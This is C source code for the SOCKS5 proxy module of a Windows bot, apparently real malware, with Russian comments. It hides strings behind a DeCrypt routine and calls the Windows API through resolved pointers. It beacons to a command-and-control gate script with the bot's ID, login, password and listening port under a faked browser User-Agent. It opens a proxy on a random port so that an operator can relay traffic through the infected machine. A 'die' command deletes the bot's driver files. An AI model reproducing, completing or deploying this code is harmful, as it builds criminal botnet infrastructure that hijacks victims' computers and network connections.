//----------------------------------------------------------------------------
DWORD WINAPI SocksClientThread(LPVOID pParam)
{
	DWORD dwRet = 0;
	PSOCKS_CONNECT sConnect = (PSOCKS_CONNECT)pParam;
  	struct timeval	timeout;
	fd_set fd;
	SOCKS_CONNECT_REQUEST sConReq = { 0 };
	SOCKS_CONNECT_RESP sConErr = { 0 };
	timeout.tv_sec = SOCKS_TIME_OUT;
	timeout.tv_usec = 0;

	FD_ZERO(&fd);
	FD_SET(sConnect->hClient, &fd);

	dwRet = api.pselect(0, &fd, NULL, NULL, &timeout);
	if(dwRet <= 0)
	{
		//DbgPrint("--- Time limit for thread [%d] expired. Error %08X | dwRet %08X FIX IT !\n",sConnect->dwMainThreadId,WSAGetLastError(),dwRet);
		dwRet = -1;
		goto error;
	}

	if(!SocksAuth(sConnect->hClient))
	{
		DbgMsg(__FILE__,__LINE__,"Error auth client");
		goto error;
	}
 
	if(!SocksCheckMethod(sConnect,&sConReq))
	{
		DbgMsg(__FILE__,__LINE__,"Error client connect method %08X",sConnect->hClient);
		dwRet = -1;	
		goto error;
	}

#ifdef _DEBUG_
	DbgMsg(__FILE__,__LINE__,"NT[0x%08X] L:%s P:%s logged, start loop",sConnect->dwMainThreadId,pUserInfo->szLogin,pUserInfo->szPassword);
#endif

	sConnect->hServer = api.psocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(sConnect->hServer == INVALID_SOCKET)
	{
		dwRet = -1;
		goto error;
	}

	if(socks_CONNECT(sConnect->hServer, (SOCKADDR *)&sConnect->server_in, sizeof(sConnect->server_in)) == SOCKET_ERROR)
	{
		DbgMsg(__FILE__,__LINE__,"Error connect to remote server");
		sConErr.Ver = SOCKS_VERSION;
		sConErr.Rep = SOCKS_CONNECT_ERROR;	// error
		socks_SEND(sConnect->hClient,&sConErr,5,"");//"error connect to dst host");
		dwRet = -1;
		goto error;
	}

#ifdef _DEBUG_
	DbgPrint("--- Connected to %d.%d.%d.%d:%d\n",
		sConnect->server_in.sin_addr.S_un.S_un_b.s_b1,
		sConnect->server_in.sin_addr.S_un.S_un_b.s_b2,
		sConnect->server_in.sin_addr.S_un.S_un_b.s_b3,
		sConnect->server_in.sin_addr.S_un.S_un_b.s_b4,
		sConnect->server_in.sin_port);
#endif

	sConErr.Ver = SOCKS_VERSION;
	sConErr.Port= sConnect->client_in.sin_port;
	sConErr.Rsv = SOCKS_RESERVED;
	sConErr.Rep = SOCKS_CONNECTED;
	sConErr.Atyp = SOCKS_ATYPE_IP4;
	sConErr.Domain.sin_addr = sConnect->server_in.sin_addr;
	memcpy(&sConErr.Domain.szDomain[4],&sConnect->server_in.sin_port,2);
	socks_SEND(sConnect->hClient,&sConErr,10,"");//"connected to dst host");

	// here we can do all work
	// запускаем поток получения данных от клиента для сервера
	sConnect->sClientThreadInfo.hClient = sConnect->hClient;	// src
	sConnect->sClientThreadInfo.hServer = sConnect->hServer;	// dst
	sConnect->sClientThreadInfo.hThread = api.pCreateThread(NULL, 0, &SocksLoopBytes, (LPVOID)&sConnect->sClientThreadInfo, CREATE_SUSPENDED, &sConnect->sClientThreadInfo.dwClientThreadId);
	if(sConnect->sClientThreadInfo.dwClientThreadId)
	{ 
		// поток успешно создался
		DbgPrint("--- Thread for transfer from client to server started %08X\n",sConnect->sClientThreadInfo.dwClientThreadId); 
		api.pResumeThread(sConnect->sClientThreadInfo.hThread);
	}	else	{ 
		// ошибка при создании потока
		DbgPrint("--- Error create Thread for transfer from client to server!!!\n"); 
		sConErr.Ver = SOCKS_VERSION;
		sConErr.Rep = SOCKS_CONNECT_ERROR;	// error
		socks_SEND(sConnect->hClient,&sConErr,5,"");//"error connect to dst host");
		dwRet = -1;
		goto error;
	}

	while(	sConnect->sClientThreadInfo.hThread != NULL )
	{
		api.pSleep(SOCKS_THREADS_WAIT_TIME);
	}
	
error:

	if(sConnect->hServer)
		api.pclosesocket(sConnect->hServer);
	if(sConnect->hClient)
		api.pclosesocket(sConnect->hClient);
	FREE(pParam);
	api.pExitThread(dwRet);
	return -1;
}
//----------------------------------------------------------------------------
DWORD WINAPI Socks5(LPVOID pParam)
{
	while(g_bDie == FALSE)
	{
		if(SocksKnockStat((PVOID)&botOpt))
		{
			if(botOpt.bStarted == TRUE)
			{
				if(hThreadSocks5 == 0)
				{
					hThreadSocks5 = api.pCreateThread(NULL, 0, &StartSocksServer, (LPVOID)&botOpt.uBotListenPort, CREATE_SUSPENDED, &dwThreadId);
					if(hThreadSocks5)
					{
						api.pResumeThread(hThreadSocks5);
					}	else	{
						hThreadSocks5 = 0;
						botOpt.bStarted = FALSE;
					}
				}
			}
		}
		api.pSleep(pGlobOpt->dwSleepTime);
	}
	api.pExitThread(-1);
	return 1;
}
//----------------------------------------------------------------------------
BOOL SocksSendError(BYTE ErrorType,SOCKET hSock)
{
	SOCKS_CONN_REP ConnRep = { 0 };

	ConnRep.Atyp	= 0x00;
	ConnRep.Rsv		= 0x00;
	ConnRep.Rep		= ErrorType;
	ConnRep.Ver		= 0x05;
	if(socks_SEND(hSock,&ConnRep,5,""/*"Send Error"*/) <= 0)
		return FALSE;
	else
		return TRUE;
}
//----------------------------------------------------------------------------
static int
resolve_hostname (const char *host, unsigned long *ip)
{
  unsigned long address = api.pinet_addr (host);
  if (address == INADDR_NONE)
    {
      struct hostent *phe = api.pgethostbyname(host);
      if (!phe)
	  {
		DbgPrint("Error resolve name !");
		return 1;
	  }
      address = *(((unsigned long **) phe->h_addr_list)[0]);
    }
  *ip = address;
  return 0;
}
//----------------------------------------------------------------------------
BOOL SocksInitUserInfo(PSOCKS_USER_INFO pUInfo,BOT_OPTIONS *pOpt)
{
	// rewrite in release
	pUInfo->bLoginLength = 10;
	pUInfo->bPasswLength = 10;
	pUInfo->szLogin		 = ALLOC(pUInfo->bLoginLength);
	pUInfo->szPassword	 = ALLOC(pUInfo->bPasswLength);

	
#ifdef _DEBUG_
	memcpy(pUInfo->szLogin,pGlobOpt->szLogin,strlen(pGlobOpt->szLogin));
	memcpy(pUInfo->szPassword,pGlobOpt->szPassw,strlen(pGlobOpt->szPassw));
	memcpy(pOpt->szBotId,pGlobOpt->szBotId,BOT_ID_LEN);
	pOpt->uBotListenPort = 13000;
#else
	memcpy(pUInfo->szLogin,pGlobOpt->szLogin,BOT_LOGIN_LEN);
	memcpy(pUInfo->szPassword,pGlobOpt->szPassw,BOT_PASSW_LEN);
	memcpy(pOpt->szBotId,pGlobOpt->szBotId,BOT_ID_LEN);
	pOpt->uBotListenPort = GetRandomNum(pGlobOpt->dwPortRangeStart,pGlobOpt->dwPortRangeEnd);
#endif
	
	
	DbgPrint("Listen port : %d\n",pOpt->uBotListenPort);

	return TRUE;
}
//----------------------------------------------------------------------------
DWORD WINAPI StartSocksServer(LPVOID pParam)
{
	DWORD dwThreadId,dwRet,dwThreadPriority;
	PSOCKS_CONNECT sConnect = NULL;
	USHORT uPort;
 	SOCKADDR_IN client_in,server_in;
	DWORD dwSize = 0;
	SOCKET hClient,hServer;

	uPort = botOpt.uBotListenPort;

	server_in.sin_family = AF_INET;
	server_in.sin_port = api.phtons(uPort);
	server_in.sin_addr.s_addr = INADDR_ANY;
	hServer = api.psocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if(hServer == INVALID_SOCKET)
	{
#ifdef _DEBUG_
		DbgMsg(__FILE__,__LINE__,"Error call socket, return %08",api.pWSAGetLastError());
#endif
		return FALSE;
	}	else	{
#ifdef _DEBUG_
		DbgMsg(__FILE__,__LINE__,"socket, return %08X",hServer);
#endif
	}
	
	if(api.pbind(hServer, (struct sockaddr*)&server_in, sizeof(server_in)) != 0)
	{
#ifdef _DEBUG_
		DbgMsg(__FILE__,__LINE__,"Error call bind, return %08",api.pWSAGetLastError());
#endif
		return FALSE;
	}	else	{
#ifdef _DEBUG_
		DbgMsg(__FILE__,__LINE__,"Port %d binded",uPort);
#endif
	}

	dwRet = api.plisten(hServer, pGlobOpt->dwMaxUsers);
	if( dwRet != 0)
	{
#ifdef _DEBUG_
		DbgMsg(__FILE__,__LINE__,"error Listing connections, dwRet %08X",dwRet);
#endif
		return FALSE;
	}	else	{
#ifdef _DEBUG_
		DbgMsg(__FILE__,__LINE__,"Listing %d connections...",pGlobOpt->dwMaxUsers);
#endif
	}

	dwSize = sizeof(client_in);
	while(TRUE)
	{
		dwThreadPriority = GetThreadPriority(GetCurrentThread());
		SetThreadPriority(GetCurrentThread(),THREAD_PRIORITY_LOWEST);
		
		while (1) {
			hClient = SOCKET_ERROR;
			while ( hClient == SOCKET_ERROR ) {
				hClient = api.paccept( hServer, (struct sockaddr *)&client_in, &dwSize);
			}
			break;
		}		

		//SetThreadPriority(GetCurrentThread(),dwThreadPriority);

 		DbgPrint("--- Client %d.%d.%d.%d:%d connected\n",client_in.sin_addr.S_un.S_un_b.s_b1,client_in.sin_addr.S_un.S_un_b.s_b2,client_in.sin_addr.S_un.S_un_b.s_b3,client_in.sin_addr.S_un.S_un_b.s_b4,client_in.sin_port);
 
		sConnect = ALLOC(sizeof(SOCKS_CONNECT));
		if(sConnect)
		{
			// выделяем память для структуры коннекта. функция в новом потоке дальше должна все остальное заполнить
			memcpy(&sConnect->client_in,&client_in,sizeof(client_in));
			sConnect->hThread = api.pCreateThread(NULL, 0, &SocksClientThread, (LPVOID)sConnect, CREATE_SUSPENDED, &dwThreadId);
			if(sConnect->hThread)
			{
				sConnect->dwMainThreadId = dwThreadId;
				sConnect->hClient = hClient;
				api.pResumeThread(sConnect->hThread);
			}
		}	else	{
			api.pclosesocket(hClient);
#ifdef _DEBUG_
			DbgMsg(__FILE__,__LINE__,"Error allocate memory for Client %d.%d.%d.%d:%d",0,
			client_in.sin_addr.S_un.S_un_b.s_b1,
			client_in.sin_addr.S_un.S_un_b.s_b2,
			client_in.sin_addr.S_un.S_un_b.s_b3,
			client_in.sin_addr.S_un.S_un_b.s_b4,
			client_in.sin_port);
#endif
		}
	}
	//-----
	shutdown(hServer,0);
	api.pclosesocket(hServer);

	api.pWSACleanup();
	botOpt.bStarted = FALSE;
	api.pExitThread(-1);
}
//----------------------------------------------------------------------------
BOOL SocksKnockStat(PBOT_OPTIONS pBotOpt)
{
	BOOL bRet;
	SOCKET hServer;
	DWORD	dwLen,dwTempLen;
	PCHAR szPtr,szRequest,szTmpPtr,szUpdateUrl,szCmd,pDriverPath;
	struct	sockaddr_in sin_addr = { 0 };	
	
	szRequest	= (char*)ALLOC(500);
	szTmpPtr	= (char*)ALLOC(100);

	if(	!szRequest	||
		!szTmpPtr)
		ERROR_EXIT();

/*
	GET /socks5/gate.php?info&port=13000&id=@!HQWASOQBS&passwd=SIA:GJWYZX&login=WPLAJSYCBF&ver=1 HTTP/1.1
	User-Agent: Opera/9.26 (Windows NT 5.1; U; en)
	Host: 192.168.168.217
*/
	strcpy(szRequest,DeCrypt("\x9c\x9e\x87\x53"));								//"GET ");					// "GET "
	strcat(szRequest,pGlobOpt->szGateUrl);										// "GET /socks5/gate.php"
	strcat(szRequest,DeCrypt("\xb4\x82\x85\x7d\x84\x3d\x83\x84\xe9\xe7\xb6"));	//"?info&port=");			// "GET /socks5/gate.php?info&port="
	itoa(pBotOpt->uBotListenPort,szTmpPtr,10);	
	strcat(szRequest,szTmpPtr);													// "GET /socks5/gate.php?info&port=13000"
	strcat(szRequest,DeCrypt("\x3d\x82\x77\xb6"));								//"&id=");					// "GET /socks5/gate.php?info&port=13000&id="
	memcpy(szTmpPtr,pGlobOpt->szBotId,BOT_ID_LEN);
	strcat(szRequest,szTmpPtr);													// "GET /socks5/gate.php?info&port=13000&id=ID"
	strcat(szRequest,DeCrypt("\x3d\x83\x7a\xe8\xe8\xec\x77\xb6"));				//"&passwd=");				// "GET /socks5/gate.php?info&port=13000&id=ID&passwd="
	memcpy(szTmpPtr,pGlobOpt->szPassw,BOT_PASSW_LEN);
	strcat(szRequest,szTmpPtr);													// "GET /socks5/gate.php?info&port=13000&id=ID&passwd=PASSWD"
	strcat(szRequest,DeCrypt("\x3d\x7f\x84\x7c\x82\x85\xb6"));					//"&login=");				// "GET /socks5/gate.php?info&port=13000&id=ID&passwd=PASSWD&login="
	memcpy(szTmpPtr,pGlobOpt->szLogin,BOT_LOGIN_LEN);
	strcat(szRequest,szTmpPtr);													// "GET /socks5/gate.php?info&port=13000&id=ID&passwd=PASSWD&login=LOGIN"
	strcat(szRequest,DeCrypt("\x3d\xed\x7e\xe9\xb6"));							//"&ver=");					// "GET /socks5/gate.php?info&port=13000&id=ID&passwd=PASSWD&login=LOGIN&ver="
	itoa(pGlobOpt->dwBotVersion,szTmpPtr,10);
	strcat(szRequest,szTmpPtr);													// "GET /socks5/gate.php?info&port=13000&id=ID&passwd=PASSWD&login=LOGIN&ver=1"
	strcat(szRequest,DeCrypt("\x53\x9b\x87\x87\xa3\x44\xaa\x45\xaa"));	//" HTTP/1.1"); 
	szRequest[strlen(szRequest)] = '\r';
	szRequest[strlen(szRequest)] = '\n';
	//strcat(szRequest,DeCrypt("\x8e\xe8\x7e\xe9\x46\x9a\x7c\x7e\x85\xe7\xb1\x53\x9c\x84\x83\x7e\xe9\x7a\x44\xb2\x45\xa9\xad\x53\x3b\x8c\x82\x85\x77\x84\xec\xe8\x53\xa5\x87\x53\xae\x45\xaa\xb0\x53\x8e\xb0\x53\x7e\x85\x42"));
	strcat(szRequest,DeCrypt("\x9b\x84\xe8\xe7\xb1\x53"));						//"Host: ");
#ifdef _DEBUG_
	strcat(szRequest,"192.168.1.2");			//inet_ntoa(pGlobOpt->dwAddrGate));
#else
	strcat(szRequest,DeCrypt(CONFIG_WEB_HOST_NAME));			//inet_ntoa(pGlobOpt->dwAddrGate));
#endif
	szRequest[strlen(szRequest)] = '\r';
	szRequest[strlen(szRequest)] = '\n';
	szRequest[strlen(szRequest)] = '\r';
	szRequest[strlen(szRequest)] = '\n';
	
	hServer = api.psocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(hServer == INVALID_SOCKET)
	{
		ERROR_EXIT();
	}

	sin_addr.sin_addr.S_un.S_addr = pGlobOpt->dwGateIp;
	sin_addr.sin_port = api.phtons(pGlobOpt->usPort);
	sin_addr.sin_family = AF_INET;
	
	if(socks_CONNECT(hServer,(SOCKADDR *)&sin_addr, sizeof(sin_addr)) == SOCKET_ERROR)
	{
		ERROR_EXIT();
	}
	
	dwLen = strlen(szRequest);
	dwTempLen = socks_SEND(hServer,szRequest,dwLen,0);
	if(	dwTempLen != dwLen || dwTempLen <= 0) 
		ERROR_EXIT();

	FREE(szRequest);
	szPtr = ALLOC(2048);
	if(!szPtr)
		ERROR_EXIT();
	szRequest = szPtr;

	do
	{
		memset(szTmpPtr,0,100);		

		dwLen = socks_RECV(hServer,szTmpPtr,100,"");//STR_SOCKS_DATA);
		if(dwLen <= 0 || dwLen == -1)
			break;

		memcpy(szPtr,szTmpPtr,dwLen);
		szPtr += dwLen;
	}	while(dwLen != -1 || dwLen > 0);
 
 	if(strcmp(szRequest,DeCrypt("\x9b\x87\x87\xa3\x44\xaa\x45\xaa\x53\xa9\x43\x43\x53\xa4\xa0")) == 0)
	{
#ifdef _DEBUG_
		DbgMsg(__FILE__,__LINE__,"Error , http is not OK %s",szRequest);
#endif
		ERROR_EXIT();
	}

	szCmd = strstr(szRequest,DeCrypt("\x78\x86\x77\xb1"));
	if(szCmd)
	{

		//+++++++++++++++++ DIE CMD
		szUpdateUrl = strstr(szRequest,DeCrypt("\xb1\x77\x82\x7e"));
		if(szUpdateUrl)
		{
#ifdef _DEBUG_
			DbgMsg(__FILE__,__LINE__,"Error BOT DIE CMD RECIEVED !");
#endif
			pDriverPath = ALLOC(MAX_PATH);
			GetSystemDirectory((LPTSTR)pDriverPath,MAX_PATH);
			strcat(pDriverPath,DeCrypt("\x8f\x8f\x77\xe9\x82\xed\x7e\xe9\xe8\x8f\x8f\xed\x86\x85\x7e\xe7\xeb\xab\xad\x45\xe8\xf2\xe8"));
			DeleteFile((LPCTSTR)pDriverPath);
			FREE(pDriverPath);
			pDriverPath = ALLOC(MAX_PATH);
			GetSystemDirectory((LPTSTR)pDriverPath,MAX_PATH);
			strcat(pDriverPath,DeCrypt("\x8f\x8f\xec\x78\xe8\xf1\x7a\x83\x82\x46\x88\xa3\xa9\x45\x77\x7f\x7f"));
			DeleteFile((LPCTSTR)pDriverPath);
			g_bDie = TRUE;
			api.pExitThread(-1);
			bRet = FALSE;
			goto end;
		}
		//+++++++++++++++++ UPDATE
/*		szUpdateUrl = strstr(szRequest,"update:");
		if(szUpdateUrl)
		{
#ifdef _DEBUG_
			DbgMsg(__FILE__,__LINE__,"Need update %s",szUpdateUrl+7);
#endif
			szUpdateUrl += 8;
			//bRet = BotUpdate(szUpdateUrl);
			goto end;
		}*/
		//++++++++++++++++ CMD OK
		if(strstr(szRequest,DeCrypt("\xb1\x84\x80")))
		{
#ifdef _DEBUG_
			DbgMsg(__FILE__,__LINE__,"Its ok, normally work");
#endif
			bRet = TRUE;
			goto end;
		}
	}
	bRet = TRUE;

end:
	api.pshutdown(hServer,SD_BOTH);
	api.pclosesocket(hServer);
	if(bRet)
		botOpt.bStarted = TRUE;
	else
		botOpt.bStarted = FALSE;
	if(szRequest)
		FREE(szRequest);
	if(szTmpPtr)
		FREE(szTmpPtr);
	return bRet;
}

